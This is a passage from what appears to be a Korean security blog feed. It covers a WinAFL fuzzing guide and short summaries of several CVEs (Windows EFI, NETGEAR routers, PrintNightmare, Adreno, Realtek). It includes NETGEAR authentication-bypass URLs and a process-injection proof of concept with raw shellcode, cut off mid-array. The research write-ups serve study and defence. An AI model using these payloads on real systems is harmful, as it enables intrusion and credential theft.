도달하는가입니다. 즉, total path count가 꾸준히 상승하는지 확인해야 합니다.</p><p>만약 path count가 0이거나 거의 0이라면 다음과 같은 함정들을 조사해봐야 합니다.</p><ul><li>컴파일러에 의해 타겟함수가 인라인 처리되어 WinAFL이 도달하지 못한다.</li><li>인자 개수나 함수 호출 규약이 잘못됐다.</li><li>타임아웃이 너무 낮아 harness가 너무 일찍 종료된다.</li></ul><p>퍼저를 몇 분 정도 실행한 뒤 안정성을 확인했습니다. 안정성이 낮아(80% 미만) 이슈를 디버깅해봤습니다. Harness의 안정성은 퍼저의 성능과 직결되기 때문에 매우 중요합니다.</p><p>흔히 빠지는 함정들</p><ul><li>난수 element들을 확인해봐야 합니다. 예를 들어 몇몇 hash table들은 collision을 방지하기 위해 난수를 사용합니다. 이는 coverage의 정확도를 떨어뜨리는 작업이므로 난수의 seed를 상수값으로 고정시키는 패치를 해줍니다.</li><li>몇몇 소프트웨어는 특정 global object에 대한 cach를 사용합니다. nop run을 통해 이를 방지합니다.</li><li>Windows 10 64-bit 시스템에서 돌아가는 32-bit 타겟의 stack alignment는 항상 8이 아닙니다. 이는 memcpy를 포함한 다른 AVX 최적화 코드들의 동작에 영향을 주며 coverage 또한 영향을 받습니다. harness에 stack aligne을 맞추는 코드를 추가하는 방법으로 해결할 수 있습니다.</li></ul><p>만약 위 방법이 모두 실패한다면 DynamoRIO를 사용해 harness의 인스트럭션을 추적하고 output을 비교합니다.</p><h1 id="Fuzzing-Setup"><a href="#Fuzzing-Setup" class="headerlink" title="Fuzzing Setup"></a>Fuzzing Setup</h1><p>저희는 다음 과 같은 VM을 사용합니다.</p><p>8~16 core, 32 GB of RAM, Windows 10 x64</p><p>저희는 <a href="https://sourceforge.net/projects/imdisk-toolkit/">ImDisk toolkit</a>을 사용해 RAM disk drive를 사용합니다. 빠른 타겟을 대상으로 디스크에 test case를 작성하는 것은 병목 현상을 유발하기 때문입니다.</p><p>Windows Defender 또한 성능에 악영향을 끼치니 비활성화해줍니다. WinAFL이 생성하는 test case들 중 Windows Defender에서 알려진 exploit으로 처리하는 경우도 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/19.png"></p><p>Windows Indexing Service도 비활성화해줍니다.</p><p>퍼징 도중 시스템을 재시작하거나 퍼징 하던 dll을 대체하는 등의 문제가 발생할 수 있으니 Windows Update도 비활성화해줍니다.</p><p>버그 탐색에 도움이 되므로 harness 프로세스에 대한 page heap은 활성화해줍니다.</p><p>속도는 느리지만 버그 탐색에 효과적이라는 edge coverage type을 사용했습니다.</p><p>퍼징을 시작하는 명령어는 다음과 같습니다.</p><pre><code class="hljs bash">afl-fuzz.exe -i R:\\jp2k\\<span class="hljs-keyword">in</span> -o R:\\jp2k\\out -t 20000+ -D c:\\DynamoRIO-Windows-7.0.0-RC1\\bin32 -S Slav02 — -fuzz_iterations 10000 -coverage_module JP2KLib.dll -target_module adobe_jp2k.exe -target_method fuzzme -nargs 1 -covtype edge — adobe_jp2k.exe @@</code></pre><h1 id="Initial-Corpus"><a href="#Initial-Corpus" class="headerlink" title="Initial Corpus"></a>Initial Corpus</h1><p>Harness를 완성했다면 아래 방법들로 초기 corpus를 확보해야 합니다.</p><ul><li>Online corpuses ( <a href="https://lcamtuf.coredump.cx/afl/demo/">afl corpus</a>, <a href="https://github.com/uclouvain/openjpeg-data">openjpeg-data</a> )</li><li>Test suites from open source projects</li><li>Crawlling google / duckduckgo</li><li>Corpuses from our older fuzzing projects</li></ul><h1 id="Corpus-Minimization"><a href="#Corpus-Minimization" class="headerlink" title="Corpus Minimization"></a>Corpus Minimization</h1><p>동일한 coverage를 생성하는 용량이 큰 파일을 사용하면 퍼저의 성능이 저하됩니다. AFL은 이를 해결하기 위해 afl-cmin을 사용해 corpus를 간소화 시킵니다. WinAFL은 winafl-cmin.py라는 툴을 제공합니다.</p><p>확보한 모든 파일을 winafl-cmin.py에 넣고 간소화된 corpus를 얻을 수 있습니다.</p><p>같은 파일에 대해 winafl-cmin을 두 번 돌려보고 같은 결과가 나오는지 비교해봐야 합니다. 만약 두 결과가 다르다면 harness가 비결정론 문제를 안고 있다고 볼 수 있습니다.</p><h1 id="Initial-Line-Coverage"><a href="#Initial-Line-Coverage" class="headerlink" title="Initial Line Coverage"></a>Initial Line Coverage</h1><p>Corpus를 얻었으니 이젠 line coverage를 살펴볼 차례입니다. Line coverage란 실제로 실행된 어셈블리 인스트럭션을 뜻합니다. DynamoRIO를 사용해 line coverage를 얻을 수 있습니다.</p><pre><code class="hljs bash">[dynamoriodir]\\bin32\\drrun.exe -t drcov — harness.exe testcase</code></pre><p>각 test case에 대해 위 명령어를 실행하고 결과값을 IDA <a href="https://github.com/gaasedelen/lighthouse">Lighthouse</a>로 확인합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/20.png">는데 도움이 됩니다.</p><h1 id="Fuzzing-Cycle"><a href="#Fuzzing-Cycle" class="headerlink" title="Fuzzing Cycle"></a>Fuzzing Cycle</h1><p>다음 단계는 매우 간단합니다.</p><ol><li>퍼저를 실행한다.</li><li>Coverage와 Crash 분석</li><li>Coverage 조사, cmin 그리고 반복</li></ol><p>퍼저를 돌리는 것은 특별히 어려운 일이 아닙니다. 위에서 설명한 구성대로 퍼저를 실행하기만 하면 됩니다.</p><p>저희는 다음과 같은 기능의 봇을 사용합니다.</p><ol><li>모든 퍼저의 상태(<a href="http://winafl-whatsapp.py/">winafl-whatsapp.py</a>)</li><li>각 퍼저의 시간에 따른 path 변화 그래프</li><li>Crash triage (다음 섹션에서 다룸)</li><li>멈춘 퍼저 재시작</li></ol><p>위 작업들을 자동화하는 것이 얼마나 중요한지 굳이 설명할 필요는 없겠죠? 퍼징은 지루하고 오류가 넘치는 작업입니다.</p><p>퍼저의 상태와 path를 몇 시간 주기로 확인하고 그래프에 상승세가 보인다면 coverage를 조사합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/21.png"></p><p>모든 퍼저의 모든 queue를 모아 cmin을 거치고 그 결과를 IDA로 확인합니다. 상대적으로 coverage가 작으면서 크기가 큰 함수를 찾습니다. 각 함수의 기능을 이해하려 노력하고 각 샘플이 어떤 기능을 트리거하는지 확인합니다.</p><p>이번 단계는 매우 중요합니다. 하나의 샘플을 추가하고 몇 시간의 퍼징을 통해 새로운 취약점 3개를 찾았습니다.</p><p>Coverage가 더 이상 늘어나지 않을 때까지 이 사이클을 반복했습니다. Coverage가 늘어나지 않는다는 뜻은 타겟을 변경하거나 harness를 개선해야 한다는 뜻입니다.</p><h1 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h1><p>Crash를 발생시키는 test case를 얻으면 직접 crash와 그 입력값을 분석했습니다. 하지만 중복된 결과가 많아 빠르게 전략을 바꿨습니다. <a href="https://github.com/SkyLined/BugId">Bugld</a>를 사용해 중복된 결과를 생략하고 unique crash에 대한 minimize 작업을 자동화했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/22.png"></p><h1 id="What-We-Found"><a href="#What-We-Found" class="headerlink" title="What We Found"></a>What We Found</h1><p>이런 전략을 통해 Adobe Reader와 Adobe Pro에서 53개의 critical 한 버그를 발견할 수 있었습니다.</p><p>저희는 다른 이미지 파서 스트림 디코더 등에 이러한 프로세스를 적용해봤고 아래와 같은 CVE들을 얻을 수 있었습니다.</p><p>CVE-2018-4985, CVE-2018-5063, CVE-2018-5064, CVE-2018-5065, CVE-2018-5068, CVE-2018-5069, CVE-2018-5070, CVE-2018-12754, CVE-2018-12755, CVE-2018-12764, CVE-2018-12765, CVE-2018-12766, CVE-2018-12767, CVE-2018-12768, CVE-2018-12848, CVE-2018-12849, CVE-2018-12850, CVE-2018-12840, CVE-2018-15956, CVE-2018-15955, CVE-2018-15954,CVE-2018-15953, CVE-2018-15952, CVE-2018-15938, CVE-2018-15937, CVE-2018-15936, CVE-2018-15935, CVE-2018-15934, CVE-2018-15933, CVE-2018-15932 , CVE-2018-15931, CVE-2018-15930 , CVE-2018-15929, CVE-2018-15928, CVE-2018-15927, CVE-2018-12875, CVE-2018-12874 , CVE-2018-12873, CVE-2018-12872,CVE-2018-12871, CVE-2018-12870, CVE-2018-12869, CVE-2018-12867 , CVE-2018-12866, CVE-2018-12865 , CVE-2018-12864 , CVE-2018-12863, CVE-2018-12862, CVE-2018-12861, CVE-2018-12860, CVE-2018-12859, CVE-2018-12857, CVE-2018-12839, CVE-2018-8464</p><p>jp2k에서 발견한 취약점 중 하나는 <a href="https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/">실제 공격</a>에 악용되고 있는 것으로 확인되어 발견하고 얼마 지나지 않아 Adobe에 제보했습니다.</p><p>물론 Adobe Reader의 샌드박스와 Reader Protected Mode는 exploit의 복잡도를 크게 증가시켰습니다. 위에서 언급한 공격 사례처럼 샌드 박스로부터 시스템에 영향을 미치기 위해선 또 다른 PE exploit을 요구합니다.</p><p>저희는 WinAFL을 사랑하고 더 많이 쓰이길 바라고 있습니다.</p><p>WinAFL을 사용하면서 버그나 기능 누락 등을 자주 마주쳤습니다. Windows 10 Appifier에 대한 지원 추가, CPU 선호도, 버그 수정 및 몇 가지 GUI 기능을 추가하고 업스트림 했습니다.</p><p>저희 커밋 링크입니다.</p><p>Netanel’s commits – <a href="https://github.com/googleprojectzero/winafl/commits?author=netanel01">https://github.com/googleprojectzero/winafl/commits?author=netanel01</a></p><p>Yoava’s commits – <a href="https://github.com/googleprojectzero/winafl/commits?author=yoava333">https://github.com/googleprojectzero/winafl/commits?author=yoava333</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>winafl</tag>
      
      <tag>fuzzing</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26892: AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</title>
    <link href="/2021/07/03/fabu1ous/2021-07-02/"/>
    <url>/2021/07/03/fabu1ous/2021-07-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021-26892-an-authorization-bypass-on-the-microsoft-windows-efi-system-partition">AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Extensible Firmware Interface</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Extensible Firmware Interface의 보안 기능을 우회하는 방법이 발견됐습니다. UEFI는 BIOS를 대체하는 펌웨어 규격으로 부팅 시 프로세서가 실행하는 첫 인스트럭션을 담고 있습니다. UEFI는 EFI System Partiton(이하 ESP)를 포함한 boot device를 탐색하는 작업을 합니다. ESP는 FAT 파일 시스템 포맷을 따르며 OS를 실행하기 위해 펌웨어가 파싱하는 <code>.EFI</code>파일(부트로더라고도 불림)을 담고 있습니다. FAT 파일 시스템은 ACL이나 보안 정책을 파일에 기록하지 않기 때문에 Windows에 마운트 되면 누구나 그 안에 있는 모든 파일에 읽기 또는 쓰기 작업을 할 수 있습니다. 부팅에 필요한 critical 파일을 누구나 접근할 수 있다면 악성코드를 담은 bootkit으로 대체되는 등의 문제가 발생할 수 있습니다. 따라서 Windows는 부팅이 완료된 이후에 ESP가 마운트 되는 것을 제한하고, 만약 마운트 됐다 하더라도 관리자 권한이 없다면 해당 볼륨에 어떠한 작업도 허용하지 않습니다.</p><p>하지만 <code>CreateFile</code> API와 ESP 볼륨 이름을 포함한 절대 경로를 통해 관리자 권한 없이 ESP 내부에 존재하는 임의의 <code>.EFI</code> 파일 핸들을 얻어 해당 파일의 내용을 백지화할 수 있습니다. 이미 존재하는 파일에 대해 <code>dwDesiredAccess</code> 값이 없고 <code>dwCreateDisposition</code> 에 <code>CREATE_ALWAYS</code>  플래그를 사용한 <code>CreateFile</code> 요청은 대상 파일의 크기를 0으로 축소합니다. 이를 악용해 관리자 권한이 없는 사용자라도 critical한 <code>.EFI</code> 파일의 내용을 지워버릴 수 있고 해당 시스템이 부팅하지 못하도록 만들 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateFileA</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>auth bypass</tag>
      
      <tag>efi</tag>
      
      <tag>boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] NETGEAR firmware 취약점</title>
    <link href="/2021/07/02/idioth/2021-07-02/"/>
    <url>/2021/07/02/idioth/2021-07-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/">Microsoft finds new NETGEAR firmware vulnerabilities that could lead to identity theft and full system compromise</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NETGEAR DGN-2200v1 시리즈</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>마이크로소프트에서 NETGEAR DGN-2200v1 시리즈 라우터에서 네트워크 보안을 손상시킬 수 있는 세 가지 취약점을 발견하였습니다.</p><p><strong>인증 우회를 통한 라우터 관리자 페이지 접근</strong></p><p>HTTPd 내부 처리 코드에서 <code>strstr</code>을 사용하여 전체 문자열에서 <code>.jpg</code>, <code>.gif</code>, <code>ess_</code> 등의 문자열이 마지막에 존재하는지 확인합니다. 따라서 GET 파라미터를 통해 인증이 필요한 페이지 뒤에 해당 필터링이 걸린 문자를 넣으면 인증을 우회하고 페이지에 접근이 가능합니다.</p><pre><code class="hljs asciidoc">예시) <span class="hljs-link">http://127</span>[<span class="hljs-string">.</span>]<span class="hljs-link">0[.]0</span>[<span class="hljs-string">.</span>]<span class="hljs-link">1/admin.htm?pic.gif</span></code></pre><p><strong>Cryptographic side-channel을 통해 저장된 라우터 자격 증명 가져오기</strong></p><p>라우터에서 HTTPd 페이지에 인증해야하는 경우 HTTP basic authentication이 필요합니다. 사용자 이름과 비밀번호는 base64로 인코딩되고 HTTP 헤더로 전송된 후 라우터의 메모리에 저장된 이름과 비밀번호와 비교해 확인합니다. 라우터는 파일 시스템 외부에 있는 NVRAM에 인증 정보를 저장하므로 이를 추출할 수 있습니다.</p><p>하지만 인증 부분에서 이름과 비밀번호를 <code>strcmp</code>를 사용하여 비교합니다. <code>strcmp</code>는 NUL을 만나거나 일치하지 않는 부분이 생길 때까지 문자열을 비교하므로 실패할 때까지 걸리는 시간을 통해 side-channel attack이 가능합니다.</p><p><strong>저장된 민감한 정보 탐색</strong></p><p>위에서 설명드린 인증 우회 취약점으로 인증이 필요한 페이지에 접근하는 것 뿐만 아니라 라우터의 설정 백업/복구 기능을 사용하여 사용자 이름, 비밀번호를 가져올 수 있습니다. <code>http://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif</code>로 접근하면 설정 파일을 얻을 수 있습니다. 해당 파일은 DES로 암호화 되어있으며, 백업/복구 기능의 코드에서 <code>NtgrBak</code> 키를 통해 암호화 됩니다. 이를 통해 해커는 NVRAM에 저장된 암호를 얻을 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>side-channel attack</tag>
      
      <tag>authentication bypass</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>netgear</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1675: Windows Spooler Service 원격 코드 실행 취약점</title>
    <link href="/2021/07/01/l0ch/2021-07-01/"/>
    <url>/2021/07/01/l0ch/2021-07-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/afwu/PrintNightmare">PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PrintNightmare라는 이름의 Printer Spooler 원격 코드 실행 취약점의 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 프린터 서버에 드라이버를 추가하거나 업데이트하는 과정에서 발생합니다. <code>RpcAddPrinterDriver</code> 함수는 프린터 드라이버를 추가할 때 Spooler Service에 대한 검사를 수행합니다.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-function">__int64 __fastcall <span class="hljs-title">SplAddPrinterDriverEx</span><span class="hljs-params">(.. <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4 ..)</span></span>&#123;<span class="hljs-number">2</span>:...<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>( !_bittest((<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *)&amp;a4, <span class="hljs-number">0xF</span>u))<span class="hljs-number">5</span>:v11 = a7;<span class="hljs-number">6</span>:<span class="hljs-keyword">if</span>(v11 &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)ValidateObjectAccess(<span class="hljs-number">0</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">0</span>i64)<span class="hljs-number">7</span>:<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<span class="hljs-number">8</span>:<span class="hljs-keyword">return</span> InternalAddPrinterDriverEx(lpString1, a2, a3, a4, (struct _INISPOOLER *)a5, a6, v11, <span class="hljs-number">0</span>i64);<span class="hljs-number">9</span>:<span class="hljs-number">10</span>:&#125;</code></pre><p>line 4와 5에서 <code>a4</code>는 유저 권한의 사용자가 제어할 수 있으며 해커는 이를 이용해 검사를 우회하고 악성 DLL을 타겟 서버에 설치할 수 있습니다. 또한 프린터 드라이버 정보 구조체의 <code>pConfigFile</code>이 UNC 경로가 허용된다는 점을 이용해 원격으로 타겟 서버에 로드할 수 있으며 드라이버 업그레이드의 백업 기능으로 액세스 충돌을 우회하고 로드된 악성 dll을 spooler service에 삽입할 수 있습니다.</p><blockquote><p>UNC(Universal Naming Convention) : 네트워크 상의 공유 파일 경로 포맷 ex) \servername\sharename\path\filename</p></blockquote><p>해당 취약점에 대해 Microsoft는 2021년 6월 8일 Patch Tuesday 릴리즈에서 패치했지만 패치가 취약점을 해결하지 못한 것으로 알려졌습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0">https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>L0ch</tag>
      
      <tag>printer spooler</tag>
      
      <tag>printnightmare</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</title>
    <link href="/2021/06/30/fabu1ous/2021-06-30/"/>
    <url>/2021/06/30/fabu1ous/2021-06-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html">CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm Adreno GPU</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Qualcomm Adreno GPU는 여러 프로세스의 메모리 매핑을 동싱에 처리하는 과정에서 Use-after-free 취약점이 발생합니다. GPU는 여러 VMA(Linux Virtual Memory Access)와 메모리 매핑을 공유하고 하나의 매핑이 닫히면 <code>kpsl_gpumem_vm_close</code> 함수를 호출해 <code>entry-&gt;memdesc.useraddr</code> 필드를 초기화합니다. 문제는 해당 필드가 여러 VMA에 공유되며 entry가 이미 매핑되었는지 확인하는 데 사용되므로 나머지 VMA에 의도하지 않은 버그가 발생합니다. Linux kernel mmap implementation에 따라 서로 다른 프로세스에서 동시에 호출이 불가능한 함수 <code>kpsl_get_unmapped_area</code>를 두 프로세스에서 같은 GPU 매핑에 대해 경쟁하도록 race condition을 발생시킬 수 있습니다. 따라서 구조체 <code>kpsl_mem_entry</code>가 서로 다른 두 프로세스에서 동시에 사용되어 use-after-free로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>uaf</tag>
      
      <tag>race-condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-32537: Realtek 드라이버의 OOB Access 취약점</title>
    <link href="/2021/06/29/l0ch/2021-06-29/"/>
    <url>/2021/06/29/l0ch/2021-06-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-32537">CVE-2021-32537: Out-of-bounds access in RTKVHD64 leading to pool corruption.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Surface Book/Pro</li><li>Lenovo Thinkpad</li><li>Dell XPS 13</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Realtek의 오디오 드라이버에서 OOB Access 취약점이 발견되어 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 오디오 드라이버 <code>RTKVHD64.sys</code>에서 발생합니다. 해당 드라이버는 초기화 중 <code>PcAddAdapterDevice</code> 함수의 파라미터인 <code>StartDevice</code>에 의해 호출된 <code>InitDeviceExtension</code> 함수에서 커널 풀에 <code>MEVT</code> 구조체를 할당합니다.</p><pre><code class="hljs c">devext-&gt;unk-&gt;events = ExAllocatePoolWithTag(pooltype, 0x5F0ui64, &#x27;mEvt&#x27;);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> &#123;</span>    PKSPIN_LOCK lock;    PVOID       event;    UINT64      someflag;&#125; <span class="hljs-comment">/* sizeof == 0x18 */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MEVT</span> &#123;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> <span class="hljs-title">array</span>[63];</span>    UINT64 flags;&#125; <span class="hljs-comment">/* sizeof == 0x18*63 + 8 == 0x5f0 */</span></code></pre><p><code>MEVT</code>의 <code>EVT</code> 구조체는 63개의 고정된 크기의 배열입니다.</p><pre><code class="hljs c">input_index = *(_DWORD *)IrpSystemBuffer;v5 = Crash(mevts, <span class="hljs-built_in">stack</span>-&gt;FileObject, unk, &amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index].event,        (KSPIN_LOCK *)&amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index]);</code></pre><p>드라이버에 <code>0x225f04</code> IOCTL 코드를 전송하면 유저버퍼인 <code>IrpSystemBuffer</code>의 첫 번째 DWORD 데이터가 <code>input_index</code>에 저장됩니다. <code>input_index</code>는 위 <code>Crash</code> 함수에서 <code>(KSPIN_LOCK *)&amp;mevts-&gt;array[input_index]</code>와 같이 <code>MEVT</code>의 <code>EVT</code> 배열에 접근할 때 인덱스로 사용됩니다. 따라서 해커는 IOCTL 입력 버퍼를 통해 <code>input_index</code>를 임의의 값으로 설정할 수 있어 Out Of Bound Access로 이어집니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>oob</tag>
      
      <tag>L0ch</tag>
      
      <tag>driver</tag>
      
      <tag>realtek</tag>
      
      <tag>out-of-bound</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Process Injection without Write/Execute Permission</title>
    <link href="/2021/06/28/idioth/2021-06-28/"/>
    <url>/2021/06/28/idioth/2021-06-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xret2pwn.github.io//process-inection/">Process Injection without Write/Execute Permission</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 블로그에서 non-writable allocation에 shellcode를 작성하고 non-executable allocation에서 이를 실행하는 방법이 공개되었습니다.</p><p>먼저 non-writable allocation에 <code>VirtualAlloc</code>을 통해 <code>PAGE_EXECUTE_READ</code> 권한을 부여하여 shellcode를 작성합니다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Allocation created successfully %p \n&quot;</span>, exec);<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Shellcode wrote successfully.&quot;</span>);&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] No permission to write the shellcode.&quot;</span>);&#125;</code></pre><p><img src="https://xret2pwn.github.io/assets/img/posts/Process_Injection/cpp_write_the_shellcode_executed.png" alt="screenshot_4"></p><p>성공적으로 shellcode가 작성됨을 확인할 수 있습니다. 그 후 해당 영역 (non-executable allocation)에 <code>PAGE_READONLY</code> 권한을 부여합니다. 하지만 DEP (Data Execution Prevention) 보호 기법으로 인해 메모리에서 직접 shellcode를 실행할 수 없습니다. 따라서 DEP가 걸려있지 않은 프로세스를 찾아 해당 프로세스에 shellcode를 injection 하면 읽기/쓰기 권한 없이 shellcode를 실행할 수 있습니다.</p><p>POC는 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =        <span class="hljs-string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&quot;</span>        <span class="hljs-string">&quot;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&quot;</span>        <span class="hljs-string">&quot;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&quot;</span>        <span class="hljs-string">&quot;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&quot;</span>        <span class="hljs-string">&quot;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&quot;</span>        <span class="hljs-string">&quot;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&quot;</span>        <span class="hljs-string">&quot;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&quot;</span>        <span class="hljs-string">&quot;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&quot;</span>        